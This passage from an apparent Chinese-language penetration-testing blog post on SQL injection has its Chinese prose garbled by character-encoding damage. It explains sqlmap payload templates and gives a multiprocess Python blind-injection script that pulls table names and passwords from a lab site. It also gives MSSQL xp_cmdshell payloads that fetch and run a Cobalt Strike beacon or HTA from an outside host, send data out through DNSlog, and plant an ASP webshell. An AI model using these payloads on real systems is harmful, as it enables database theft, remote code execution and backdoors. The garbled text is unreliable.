class="string">&quot; &quot;</span>, <span class="string">&quot;%0a&quot;</span>).replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;like&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="å¢åŠ æ–°çš„Payload"><a href="#å¢åŠ æ–°çš„Payload" class="headerlink" title="å¢åŠ æ–°çš„Payload"></a>å¢åŠ æ–°çš„Payload</h2><p>ç›®å½•åœ¨<code>./data/xml/payload</code></p>
<p>å¯ä»¥çœ‹åˆ°6ä¸ªxmlæ–‡ä»¶</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdowncjM2FqdQuzpoN9C.png"></p>
<p>æ‹¿<code>boolean_blind.xmlæ–‡ä»¶</code>é‡Œé¢çš„ä¸€éƒ¨åˆ†æ¥åˆ†æ</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">title</span>&gt;</span>SAP MaxDB boolean-based blind - Stacked queries<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">stype</span>&gt;</span>1<span class="tag">&lt;/<span class="name">stype</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">level</span>&gt;</span>5<span class="tag">&lt;/<span class="name">level</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">risk</span>&gt;</span>1<span class="tag">&lt;/<span class="name">risk</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">clause</span>&gt;</span>1-8<span class="tag">&lt;/<span class="name">clause</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">where</span>&gt;</span>1<span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">vector</span>&gt;</span>;SELECT CASE WHEN [INFERENCE] THEN 1 ELSE NULL END<span class="tag">&lt;/<span class="name">vector</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">request</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">payload</span>&gt;</span>;SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END<span class="tag">&lt;/<span class="name">payload</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">comment</span>&gt;</span>--<span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">request</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">response</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">comparison</span>&gt;</span>;SELECT CASE WHEN [RANDNUM]=[RANDNUM1] THEN 1 ELSE NULL END<span class="tag">&lt;/<span class="name">comparison</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">response</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">details</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">dbms</span>&gt;</span>SAP MaxDB<span class="tag">&lt;/<span class="name">dbms</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">details</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>title<br>  titleå±æ€§ä¸ºå½“å‰æµ‹è¯•Payloadçš„æ ‡é¢˜ï¼Œé€šè¿‡æ ‡é¢˜å°±å¯ä»¥äº†è§£å½“å‰çš„æ³¨å…¥æ‰‹æ³•ä¸æµ‹è¯•çš„æ•°æ®åº“ç±»å‹ã€‚</p>
</li>
<li><p>stype<br>  æŸ¥è¯¢ç±»å‹ã€‚</p>
</li>
<li><p>level<br>  é£é™©ç­‰çº§(1-5,é»˜è®¤1)ã€‚</p>
</li>
<li><p>risk<br>  å±é™©ç­‰çº§(1-3,é»˜è®¤1)ã€‚</p>
</li>
<li><p>clause<br>  æŒ‡å®šä¸ºæ¯ä¸ªpayloadä½¿ç”¨çš„SQLæŸ¥è¯¢ä»å¥ã€‚</p>
<p>  <img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdown7Ftj9qHuXD1zeUV.png"></p>
</li>
<li><p>where<br>  ä¸ä¸Šå›¾ä¸€è‡´ã€‚</p>
</li>
<li><p>vector<br>  æŒ‡å®šå°†ä½¿ç”¨çš„æ³¨å…¥æ¨¡ç‰ˆã€‚</p>
</li>
<li><p>payload<br>  æµ‹è¯•ä½¿ç”¨çš„payload ,[RANDNUM]ï¼Œ[DELIMITER_START]ï¼Œ[DELIMITER_STOP]åˆ†åˆ«ä»£è¡¨ç€éšæœºæ•°å€¼ä¸å­—ç¬¦ã€‚å½“SQLMapæ‰«ææ—¶ä¼šæŠŠå¯¹åº”çš„éšæœºæ•°æ›¿æ¢æ‰,ç„¶åå†ä¸boundaryçš„å‰ç¼€ä¸åç¼€æ‹¼æ¥èµ·æ¥,æœ€ç»ˆæˆä¸ºæµ‹è¯•çš„Payloadã€‚</p>
</li>
<li><p>common<br>  payload ä¹‹åï¼Œboundary æ‹¼æ¥çš„åç¼€suffixä¹‹å‰ã€‚</p>
</li>
<li><p>char<br>  åœ¨union æŸ¥è¯¢ä¸­çˆ†ç ´åˆ—æ—¶æ‰€ç”¨çš„å­—ç¬¦ã€‚</p>
</li>
<li><p>columns<br>  è”åˆæŸ¥è¯¢æµ‹è¯•çš„åˆ—æ•°èŒƒå›´ã€‚</p>
</li>
<li><p>response<br>  æ ¹æ®å›æ˜¾è¾¨åˆ«è¿™æ¬¡æ³¨å…¥çš„payloadæ˜¯å¦æˆåŠŸã€‚</p>
</li>
<li><p>comparison<br>  ä½¿ç”¨å­—ç¬¦ä¸²ä½œä¸ºpayloadæ‰§è¡Œè¯·æ±‚ï¼Œå°†å“åº”å’Œè´Ÿè½½å“åº”è¿›è¡Œå¯¹æ¯”ï¼Œåœ¨åŸºäºå¸ƒå°”å€¼çš„ç›²æ³¨ä¸­æœ‰æ•ˆã€‚</p>
</li>
<li><p>grep<br>  ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å»æ‰¹ç»“å“åº”ï¼Œåˆ¤æ–­æ—¶å€™æ³¨å…¥æˆåŠŸï¼Œåœ¨åŸºäºé”™è¯¯çš„æ³¨å…¥ä¸­æœ‰ç”¨ã€‚</p>
</li>
<li><p>time<br>  åœ¨åŸºäºtimeçš„æ³¨å…¥ä¸­ç­‰å¾…ç»“æœè¿”å›çš„æ‰€éœ€è¦çš„æ—¶é—´</p>
</li>
<li><p>detail<br>  ä¸‹è®¾ä¸‰ä¸ªå­èŠ‚ç‚¹</p>
</li>
</ul>
<p>æœ€ç»ˆçš„payloadä¸ºï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">where</span> <span class="operator">+</span> boundary.prefix<span class="operator">+</span>test.payload <span class="operator">+</span> test.common <span class="operator">+</span> <span class="operator">+</span>boundary.suffix</span><br></pre></td></tr></table></figure>

<h1 id="äºŒåˆ†æ³•-å¤šè¿›ç¨‹è„šæœ¬"><a href="#äºŒåˆ†æ³•-å¤šè¿›ç¨‹è„šæœ¬" class="headerlink" title="äºŒåˆ†æ³• + å¤šè¿›ç¨‹è„šæœ¬"></a>äºŒåˆ†æ³• + å¤šè¿›ç¨‹è„šæœ¬</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> rich.console <span class="keyword">import</span> Console</span><br><span class="line"><span class="keyword">from</span> prettytable <span class="keyword">import</span> PrettyTable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear</span>():</span><br><span class="line">    system(<span class="string">&#x27;cls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CtrlC</span>(<span class="params">q2</span>):</span><br><span class="line">    name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">        <span class="keyword">if</span> q2.empty():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            name = q2.get()</span><br><span class="line">    table = PrettyTable(</span><br><span class="line">        [<span class="string">&#x27;The blasting data is&#x27;</span>])</span><br><span class="line">    table.align = <span class="string">&#x27;l&#x27;</span></span><br><span class="line">    row = [name]</span><br><span class="line">    table.add_row(row)</span><br><span class="line">    clear()</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        q.put(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">booler_injection</span>(<span class="params">url, q, q2, v</span>):</span><br><span class="line">    console = Console()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        i = q.get()</span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            py_dict = &#123;</span><br><span class="line">                <span class="string">&#x27;str1&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;and if(ascii(mid((select database()),&#123;0&#125;,1)) &gt; &#123;1&#125;,5,0) --+&#x27;&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;str2&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;and if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema = database()),&#123;0&#125;,1)) &gt; &#123;1&#125;,5,0) --+&#x27;&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;str3&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;and if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name = 0x4E43683258684E62),&#123;0&#125;,1)) &gt; &#123;1&#125;,5,0) --+&#x27;&#x27;&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;str4&#x27;</span>: <span class="string">&#x27;&#x27;&#x27;and if(ascii(mid((select group_concat(password) from security.NCh2XhNb),&#123;0&#125;,1)) &gt; &#123;1&#125;,5,0) --+&#x27;&#x27;&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            payload_str = py_dict[<span class="string">&#x27;str2&#x27;</span>].<span class="built_in">format</span>(i, mid)</span><br><span class="line">            pld = url + payload_str</span><br><span class="line">            req1 = requests.get(pld)</span><br><span class="line">            <span class="built_in">print</span>(pld, end=<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> req1.text.find(<span class="string">&#x27;You are in&#x27;</span>) &gt; <span class="number">0</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">            q2.put(v.value)</span><br><span class="line">            CtrlC(q2)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">44</span>:</span><br><span class="line">            v.value += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        v.value += <span class="built_in">chr</span>(mid)</span><br><span class="line">        v.value = v.value.replace(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        clear()</span><br><span class="line">        console.<span class="built_in">print</span>(<span class="string">&quot;[green][+]data is -&gt; [/green]&quot;</span> + v.value + <span class="string">&#x27;\n&#x27;</span>, end=<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    v = Manager().Value(ctypes.c_char_p, <span class="string">&#x27;&#x27;</span>)  <span class="comment"># åˆ›å»ºä¸´ç•Œ</span></span><br><span class="line">    q2 = Queue()</span><br><span class="line">    q = Queue()</span><br><span class="line">    url = <span class="string">&quot;http://533b285a34d54db5a8e3acafda30c067.app.mituan.zone/Less-8/?id=1&#x27;&quot;</span></span><br><span class="line">    progress1 = []</span><br><span class="line">    generate(q)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        p1 = Process(target=booler_injection, args=(url, q, q2, v))</span><br><span class="line">        progress1.append(p1)</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> progress1:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> progress1:</span><br><span class="line">        p.join()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç»è¿‡å¤šæ¬¡æµ‹è¯•ï¼Œå­˜åœ¨ä¸€å®šç¼ºé™·ï¼š</p>
<p>  éœ€è¦çš„æ•°æ®é•¿åº¦ä½äº10ï¼Œè¿›ç¨‹æ•°ä¸èƒ½å¤§äº2ï¼Œç”¨1æœ€å¥½ã€‚</p>
<p>  éœ€è¦çš„æ•°æ®åœ¨10 - 20ä¹‹é—´ï¼Œè¿›ç¨‹æ•°ä¸èƒ½å¤§äº3ï¼Œç”¨2æœ€å¥½ã€‚</p>
<p>  éœ€è¦çš„æ•°æ®åœ¨20 - 30ä¹‹é—´ï¼Œè¿›ç¨‹æ•°ä¸èƒ½å¤§äº4ï¼Œç”¨2æœ€å¥½ã€‚</p>
<p>  ä»¥æ­¤ç±»æ¨ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<p>  å¦‚è‹¥ä½¿ç”¨çš„è¿›ç¨‹æ•°è¶…å‡ºæˆ‘æå‡ºçš„å¤§å°ï¼Œä¼šå¯¼è‡´è¿›ç¨‹ç«äº‰è¿›è€Œå‡ºç°ä¹±åºè¾“å‡ºçš„æƒ…å†µã€‚</p>
<p>ä½†æ˜¯å•çº¯çš„å¤šè¿›ç¨‹ä¸ä¼šå‡ºç°è¿™ä¸ªé—®é¢˜ï¼Œåˆæ­¥åˆ¤æ–­æ˜¯äºŒåˆ†æ³•å¤§å¹…åº¦çš„é™ä½äº†å¯¹èµ„æºçš„è°ƒç”¨ï¼Œæé«˜äº†å†™å…¥ä¸´ç•ŒåŒºçš„é¢‘ç‡ï¼Œè¿›è€Œå¯¼è‡´è¿›ç¨‹ç«äº‰ï¼Œå‡ºç°è¾“å‡ºä¹±åºï¼Œè€Œæˆ‘ç”¨çš„åˆæ˜¯é˜Ÿåˆ—å®ç°ï¼Œéœ€è¦å¯¹queueé˜Ÿåˆ—çš„é”åŸè¯­<code>__init__</code> æ‰èƒ½è§£å†³ï¼ˆ<del>ä¸€ä¸ªçŒœæµ‹</del>ï¼‰ï¼Œç•™ä¸ªå‘ï¼Œä»¥åå¡«ã€‚</p>
<h1 id="åŸºäºLOAD-FILEå‡½æ•°çš„æ— å›æ˜¾SQLæ³¨å…¥"><a href="#åŸºäºLOAD-FILEå‡½æ•°çš„æ— å›æ˜¾SQLæ³¨å…¥" class="headerlink" title="åŸºäºLOAD_FILEå‡½æ•°çš„æ— å›æ˜¾SQLæ³¨å…¥"></a>åŸºäºLOAD_FILEå‡½æ•°çš„æ— å›æ˜¾SQLæ³¨å…¥</h1><p>é€šè¿‡DNSlogç›²æ³¨éœ€è¦ç”¨çš„load_file()å‡½æ•°ï¼Œæ‰€ä»¥ä¸€èˆ¬å¾—æ˜¯rootæƒé™ã€‚å…ˆ</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹load_file()å¯ä»¥è¯»å–çš„ç£ç›˜ã€‚</p>
<ul>
<li>å½“<code>secure_file_priv</code>ä¸ºç©ºï¼Œå°±å¯ä»¥è¯»å–ç£ç›˜çš„ç›®å½•ã€‚</li>
<li>å½“<code>secure_file_priv</code>ä¸ºG:\ï¼Œå°±å¯ä»¥è¯»å–Gç›˜çš„æ–‡ä»¶ã€‚</li>
<li>å½“<code>secure_file_priv</code>ä¸ºnullï¼Œload_fileå°±ä¸èƒ½åŠ è½½æ–‡ä»¶ã€‚</li>
</ul>
<h2 id="UNCè·¯å¾„"><a href="#UNCè·¯å¾„" class="headerlink" title="UNCè·¯å¾„"></a>UNCè·¯å¾„</h2><p>ä½†æ˜¯å½“MySQLå¤„äºLinuxç³»ç»Ÿä¸­çš„æ—¶å€™ï¼Œæ˜¯ä¸èƒ½ä½¿ç”¨è¿™ç§æ–¹å¼å¤–å¸¦æ•°æ®ã€‚</p>
<p>UNCæ˜¯ä¸€ç§å‘½åæƒ¯ä¾‹, ä¸»è¦ç”¨äºåœ¨Microsoft Windowsä¸ŠæŒ‡å®šå’Œæ˜ å°„ç½‘ç»œé©±åŠ¨å™¨ã€‚<br>UNCå‘½åæƒ¯ä¾‹æœ€å¤šè¢«åº”ç”¨äºåœ¨å±€åŸŸç½‘ä¸­è®¿é—®æ–‡ä»¶æœåŠ¡å™¨æˆ–è€…æ‰“å°æœºã€‚æˆ‘ä»¬æ—¥å¸¸å¸¸ç”¨çš„ç½‘ç»œå…±äº«æ–‡ä»¶å°±æ˜¯è¿™ä¸ªæ–¹å¼ã€‚</p>
<p>è¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆconcat()å‡½æ•°æ‹¼æ¥äº†4ä¸ª\äº†ï¼Œå› ä¸ºè½¬ä¹‰çš„åŸå› ï¼Œ4ä¸ªå°±å˜\æˆäº†2ä¸ª\ï¼Œç›®çš„å°±æ˜¯åˆ©ç”¨UNCè·¯å¾„ã€‚</p>
<p>å› ä¸ºLinuxæ²¡æœ‰UNCè·¯å¾„è¿™ä¸ªä¸œè¥¿ï¼Œæ‰€ä»¥å½“MySQLå¤„äºLinuxç³»ç»Ÿä¸­çš„æ—¶å€™ï¼Œæ˜¯ä¸èƒ½ä½¿ç”¨è¿™ç§æ–¹å¼å¤–å¸¦æ•°æ®</p>
<p>ç”±æ­¤Paylaodå°±ä¸º</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(æŸ¥è¯¢è¯­å¥),<span class="string">&#x27;.t6n089.ceye.io\\abc&#x27;</span>));</span><br></pre></td></tr></table></figure>

<h1 id="åŸºäºå‘½ä»¤æ‰§è¡Œå‡½æ•°çš„æ— å›æ˜¾SQLæ³¨å…¥"><a href="#åŸºäºå‘½ä»¤æ‰§è¡Œå‡½æ•°çš„æ— å›æ˜¾SQLæ³¨å…¥" class="headerlink" title="åŸºäºå‘½ä»¤æ‰§è¡Œå‡½æ•°çš„æ— å›æ˜¾SQLæ³¨å…¥"></a>åŸºäºå‘½ä»¤æ‰§è¡Œå‡½æ•°çš„æ— å›æ˜¾SQLæ³¨å…¥</h1><p>ä¸€ä¸ªMsSql<code>é«˜æƒé™</code>æ³¨å…¥ç‚¹ï¼Œå¯é€šè¿‡<code>xp_cmdshell</code>æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰å›æ˜¾ä¿¡æ¯ã€‚</p>
<p>å› ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥åˆ†2ç§æ–¹å¼åˆ©ç”¨ã€‚</p>
<h2 id="è¿œç¨‹æ‰§è¡Œæ–¹å¼ä¸Šçº¿"><a href="#è¿œç¨‹æ‰§è¡Œæ–¹å¼ä¸Šçº¿" class="headerlink" title="è¿œç¨‹æ‰§è¡Œæ–¹å¼ä¸Šçº¿"></a>è¿œç¨‹æ‰§è¡Œæ–¹å¼ä¸Šçº¿</h2><p>payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">;exec master..xp_cmdshell <span class="string">&quot;cmd /c ping ******.dnslog.cn&quot;</span></span><br><span class="line">;exec master..xp_cmdshell <span class="string">&quot;cmd /c mshta http://192.168.1.105:8080/evil.hta&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="æ–‡ä»¶è½åœ°æ–¹å¼ä¸Šçº¿"><a href="#æ–‡ä»¶è½åœ°æ–¹å¼ä¸Šçº¿" class="headerlink" title="æ–‡ä»¶è½åœ°æ–¹å¼ä¸Šçº¿"></a>æ–‡ä»¶è½åœ°æ–¹å¼ä¸Šçº¿</h2><p>æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¿™äº›æ–‡ä»¶è½åœ°æ–¹å¼æ¥ä¸Šçº¿CS&#x2F;MSFï¼Œä½†å‰ææ˜¯å¾—æå‰å‡†å¤‡å¥½ä¸€ä¸ªå…æ€çš„CSæœ¨é©¬ä¾›è¿œç¨‹ä¸‹è½½å’Œæ‰§è¡Œï¼Œå¦åˆ™ä¹Ÿä¼šè¢«æŸ¥æ€å’Œæ‹¦æˆªã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Mshta/Certutil/Bitsadmin/Powershell/MpCmdRun</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell &quot;cmd /c certutil -urlcache -split -f http://192.168.1.105:8080/beacon.exe C:\ProgramData\beacon.exe&quot;</span><br><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell &quot;cmd /c C:\ProgramData\beacon.exe&quot;</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶æ­¤æ–¹å¼è¿˜å¯ä»¥å®ç°å¤–å¸¦ç»å¯¹è·¯å¾„å‡ºæ¥ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;cmd /c for /r C:\ProgramData\ %i in (beacon.exe*) do certutil -urlcache -split -f http://******.ceye.io/%i&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šé™¤äº†ç”¨<code>xp_cmdshell</code>å‡½æ•°è¿˜å¯ä»¥ç”¨<code>sp_oacreate</code>æ›¿ä»£ã€‚</p>
<h2 id="è·å–ç»å¯¹è·¯å¾„Getshell"><a href="#è·å–ç»å¯¹è·¯å¾„Getshell" class="headerlink" title="è·å–ç»å¯¹è·¯å¾„Getshell"></a>è·å–ç»å¯¹è·¯å¾„Getshell</h2><p>æˆ‘ä»¬åœ¨å®æˆ˜ä¸­æœ‰æ—¶ä¹Ÿä¼šé‡åˆ°æ— å›æ˜¾ã€ä¸å‡ºç½‘çš„åœºæ™¯ï¼Œè¿™æ—¶å¯ä»¥å…ˆå»å°è¯•é€šè¿‡404æˆ–æ–‡ä»¶æŠ¥é”™é¡µæ¥è·å–ç½‘ç«™çš„ç»å¯¹è·¯å¾„ï¼Œå¦‚æœä¸è¡Œå†å»æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å°†æ‰¾åˆ°çš„è·¯å¾„å†™å…¥Webç›®å½•ä¸‹ï¼Œç„¶åå†å»å†™å…¥Webshellã€‚</p>
<p>payload</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;for /r C:\ %i in (1653042293000.png*) do echo %i&gt; %i\..\path.txt&#x27;</span></span><br><span class="line">;<span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;echo ^&lt;%execute request(&quot;1&quot;)%^&gt; &gt;C:\inetpub\wwwroot\upload\shell.asp&#x27;</span></span><br></pre></td></tr></table></figure>

<p>æˆ–è€…å¯ä»¥é€šè¿‡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤åœ¨æŸ¥æ‰¾ç»å¯¹è·¯å¾„çš„åŒæ—¶å†™å…¥Webshellï¼Œåœ¨æŒ‡å®šçš„Cç›˜ä¸­å¾ªç¯æŸ¥æ‰¾æŸæŸæ–‡ä»¶ï¼Œå°†æ‰¾åˆ°çš„ç»å¯¹è·¯å¾„ä¿å­˜åœ¨%iå˜é‡ä¸­ï¼Œ..&#x2F;æ˜¯è¿”å›ä¸Šçº§ç›®å½•ï¼Œå¦‚æœæœ‰æ‰¾åˆ°é‚£ä¸ªæ–‡ä»¶å°±å¾€é‡Œè¾¹å†™å…¥ä¸€ä¸ªshell.aspã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="operator">/</span>r C:\ <span class="operator">%</span>i <span class="keyword">in</span> (<span class="number">1653042293000.</span>png<span class="operator">*</span>) do echo <span class="operator">^</span><span class="operator">&lt;</span><span class="operator">%</span><span class="keyword">execute</span> request(&quot;1&quot;)<span class="operator">%</span><span class="operator">^</span><span class="operator">&gt;</span> <span class="operator">&gt;</span> <span class="operator">%</span>i<span class="operator">/</span>..<span class="operator">/</span>shell.asp</span><br></pre></td></tr></table></figure>

<h1 id="ç¬›å¡å°”ç§¯æ³¨å…¥"><a href="#ç¬›å¡å°”ç§¯æ³¨å…¥" class="headerlink" title="ç¬›å¡å°”ç§¯æ³¨å…¥"></a>ç¬›å¡å°”ç§¯æ³¨å…¥</h1><p>é‡åˆ°ä¸èƒ½ä½¿ç”¨æ‹¬å·ï¼Œæˆ–è€…shell()å‡½æ•°ä¸èƒ½ä½¿ç”¨çš„æƒ…å†µä¸‹ã€‚</p>
<p>å…·ä½“æ•°å­¦å®ç°å°±ä¸è¯´äº†ï¼Œå¤§æ¦‚å°±æ˜¯å¦‚ä¸‹å›¾ï¼š</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_5ERbl7aIV2.png"></p>
<p>ä¹Ÿå°±æ˜¯è¯´æ•°å­—1å…ˆå»ä¹˜ä»¥ABCï¼Œç„¶åæ•°å­—2å†å»ä¹˜ä»¥ABCï¼Œç„¶åæ•°å­—3å†å»ä¹˜ä»¥ABCï¼Œæ˜¯ä¸æ˜¯æ„Ÿè§‰å¾ˆç†Ÿæ‚‰ï¼Œå…¶å®å°±æ˜¯Burp suiteé‡Œé¢çš„Intruderæ¨¡å—çš„Attack typeé‡Œé¢çš„Clutser bombæ”»å‡»æ–¹å¼ã€‚</p>
<p>è¿™æ ·é€æ¸çš„å»ç›¸ä¹˜ï¼Œç„¶åå°±ä¼šæœ‰ä¸ªæ—¶é—´ã€‚æ‰€ä»¥åˆå«å¤§è´Ÿè·æŸ¥è¯¢ï¼Œå¤§è´Ÿè·æ³¨å…¥ã€‚</p>
<p>Payloadï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns</span><br></pre></td></tr></table></figure>



<ul>
<li><p>å½“where 1&#x3D;1æ—¶å­˜åœ¨å»¶æ—¶ï¼Œwhere 1&#x3D;2æ—¶ä¸å»¶æ—¶ï¼Œå°±è¯´æ˜å­˜åœ¨æ—¶é—´ç›²æ³¨ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,b.column_name <span class="keyword">from</span> information_schema.tables a <span class="keyword">join</span> information_schema.columns b <span class="keyword">join</span> information_schema.columns c <span class="keyword">where</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>åˆ— ï¼š åˆ¤æ–­5kcrm_userè¡¨åä¸‹nameåˆ—å‰ä¸¤ä½æ˜¯å¦ä¸ºâ€™adâ€™å¼€å¤´çš„å†…å®¹ï¼Œå¦‚æœå­˜åœ¨åˆ™å»¶æ—¶</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="number">5</span>kcrm_action_log <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,b.column_name <span class="keyword">from</span> information_schema.columns b <span class="keyword">where</span> b.column_name regexp <span class="type">binary</span> <span class="string">&#x27;^ad&#x27;</span></span><br></pre></td></tr></table></figure></li>
</ul>
